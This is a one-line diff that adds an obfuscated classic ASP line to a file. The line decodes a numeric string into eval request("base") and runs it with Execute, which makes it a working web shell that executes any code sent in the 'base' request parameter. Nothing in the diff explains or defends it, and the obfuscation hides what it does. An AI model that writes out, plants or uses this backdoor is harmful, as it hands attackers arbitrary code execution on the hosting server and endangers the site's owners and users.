@@ -1,0 +1,1 @@
+<%Execute(DeAsc("%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59")):Function DeAsc(Str):Str=Split(Str,"%"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function%>
